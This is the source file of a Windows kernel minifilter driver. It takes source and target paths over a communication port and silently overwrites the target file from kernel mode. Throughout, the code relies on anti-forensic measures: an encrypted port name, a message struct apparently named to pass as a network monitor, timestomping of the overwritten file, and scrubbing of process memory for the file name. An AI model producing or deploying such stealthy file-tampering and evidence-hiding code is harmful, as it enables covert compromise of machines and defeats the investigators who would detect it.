#include "Overwrite.h"
#include <ntstrsafe.h>
#include "skCrypter.h"
#include "MFT.h"
#include "MemoryCleaner.h"

PFLT_PORT g_ServerPort = NULL;
PFLT_PORT g_ClientPort = NULL;
extern PFLT_FILTER g_FilterHandle;

#define COPY_BUFFER_SIZE 65536

typedef struct _WINNETMON_MESSAGE {
    WCHAR TargetPath[512];
    WCHAR SourcePath[512];
} WINNETMON_MESSAGE, *PWINNETMON_MESSAGE;

typedef struct _PENDING_OVERWRITE {
    WCHAR TargetPath[512];
    WCHAR SourcePath[512];
} PENDING_OVERWRITE;

static PENDING_OVERWRITE g_PendingWork = { {0}, {0} };

static NTSTATUS KernelOverwriteFile(PCWSTR targetPath, PCWSTR sourcePath)
{
    NTSTATUS          status;
    HANDLE            hSource  = NULL;
    HANDLE            hTarget  = NULL;
    IO_STATUS_BLOCK   ioStatus = {0};
    PVOID             buffer   = NULL;

    UNICODE_STRING    uSource;
    OBJECT_ATTRIBUTES oaSource;
    RtlInitUnicodeString(&uSource, sourcePath);
    InitializeObjectAttributes(&oaSource, &uSource, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    status = ZwCreateFile(&hSource, GENERIC_READ | SYNCHRONIZE, &oaSource, &ioStatus, NULL,
        FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_OPEN, FILE_SEQUENTIAL_ONLY | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (!NT_SUCCESS(status)) return status;

    UNICODE_STRING    uTarget;
    OBJECT_ATTRIBUTES oaTarget;
    RtlInitUnicodeString(&uTarget, targetPath);
    InitializeObjectAttributes(&oaTarget, &uTarget, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    status = ZwCreateFile(&hTarget, GENERIC_WRITE | SYNCHRONIZE, &oaTarget, &ioStatus, NULL,
        FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_OVERWRITE_IF, FILE_SEQUENTIAL_ONLY | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (!NT_SUCCESS(status)) { ZwClose(hSource); return status; }

    buffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, COPY_BUFFER_SIZE, 'fCpy');
    if (!buffer) { ZwClose(hSource); ZwClose(hTarget); return STATUS_INSUFFICIENT_RESOURCES; }

    LARGE_INTEGER byteOffset;
    byteOffset.QuadPart = 0;
    while (TRUE) {
        status = ZwReadFile(hSource, NULL, NULL, NULL, &ioStatus, buffer, COPY_BUFFER_SIZE, &byteOffset, NULL);
        if (status == STATUS_END_OF_FILE) { status = STATUS_SUCCESS; break; }
        if (!NT_SUCCESS(status)) break;
        ULONG bytesRead = (ULONG)ioStatus.Information;
        if (bytesRead == 0) break;
        status = ZwWriteFile(hTarget, NULL, NULL, NULL, &ioStatus, buffer, bytesRead, &byteOffset, NULL);
        if (!NT_SUCCESS(status)) break;
        byteOffset.QuadPart += bytesRead;
    }

    ExFreePoolWithTag(buffer, 'fCpy');
    ZwClose(hSource);
    ZwClose(hTarget);

    
    TimestompTargetFile(targetPath);

    return status;
}

VOID OverwriteThread(PVOID Context)
{
    UNREFERENCED_PARAMETER(Context);
    LARGE_INTEGER delay;
    delay.QuadPart = -30000000LL;
    KeDelayExecutionThread(KernelMode, FALSE, &delay);
    KernelOverwriteFile(g_PendingWork.TargetPath, g_PendingWork.SourcePath);
    
    
    PCWSTR targetPath = g_PendingWork.TargetPath;
    PCWSTR fileName = targetPath;
    for (size_t i = 0; targetPath[i] != L'\0'; ++i) {
        if (targetPath[i] == L'\\' || targetPath[i] == L'/') {
            fileName = &targetPath[i + 1];
        }
    }
    
    
    CleanProcessMemory(fileName);
    
    PsTerminateSystemThread(STATUS_SUCCESS);
}

static NTSTATUS PortConnect(PFLT_PORT ClientPort, PVOID ServerPortCookie, PVOID ConnectionContext, ULONG SizeOfContext, PVOID *ConnectionPortCookie)
{
    UNREFERENCED_PARAMETER(ServerPortCookie);
    UNREFERENCED_PARAMETER(ConnectionContext);
    UNREFERENCED_PARAMETER(SizeOfContext);
    UNREFERENCED_PARAMETER(ConnectionPortCookie);
    g_ClientPort = ClientPort;
    return STATUS_SUCCESS;
}

static VOID PortDisconnect(PVOID ConnectionCookie)
{
    UNREFERENCED_PARAMETER(ConnectionCookie);
    FltCloseClientPort(g_FilterHandle, &g_ClientPort);
}

static NTSTATUS PortMessage(PVOID PortCookie, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength, PULONG ReturnOutputBufferLength)
{
    UNREFERENCED_PARAMETER(PortCookie);
    UNREFERENCED_PARAMETER(OutputBuffer);
    UNREFERENCED_PARAMETER(OutputBufferLength);
    if (ReturnOutputBufferLength) *ReturnOutputBufferLength = 0;
    if (!InputBuffer || InputBufferLength < sizeof(WINNETMON_MESSAGE)) return STATUS_INVALID_PARAMETER;

    __try {
        PWINNETMON_MESSAGE msg = (PWINNETMON_MESSAGE)InputBuffer;
        RtlCopyMemory(g_PendingWork.TargetPath, msg->TargetPath, 512 * sizeof(WCHAR));
        RtlCopyMemory(g_PendingWork.SourcePath, msg->SourcePath, 512 * sizeof(WCHAR));
        g_PendingWork.TargetPath[511] = L'\0';
        g_PendingWork.SourcePath[511] = L'\0';
    } __except (EXCEPTION_EXECUTE_HANDLER) { return STATUS_ACCESS_VIOLATION; }

    HANDLE hThread = NULL;
    PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, OverwriteThread, NULL);
    if (hThread) ZwClose(hThread);

    return STATUS_SUCCESS;
}

NTSTATUS InitializeOverwritePort(PFLT_FILTER filterHandle)
{
    UNICODE_STRING portName;
    OBJECT_ATTRIBUTES oa;
    PSECURITY_DESCRIPTOR sd = NULL;
    NTSTATUS status;

    auto encryptedPortName = skCrypt(L"\\DRIVERPORT");
    RtlInitUnicodeString(&portName, encryptedPortName.decrypt());
    status = FltBuildDefaultSecurityDescriptor(&sd, FLT_PORT_ALL_ACCESS);
    if (NT_SUCCESS(status)) {
        InitializeObjectAttributes(&oa, &portName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, sd);
        status = FltCreateCommunicationPort(filterHandle, &g_ServerPort, &oa, NULL, PortConnect, PortDisconnect, PortMessage, 1);
        FltFreeSecurityDescriptor(sd);
    }
    encryptedPortName.encrypt();
    return status;
}

VOID CloseOverwritePort()
{
    if (g_ServerPort) {
        FltCloseCommunicationPort(g_ServerPort);
        g_ServerPort = NULL;
    }
}
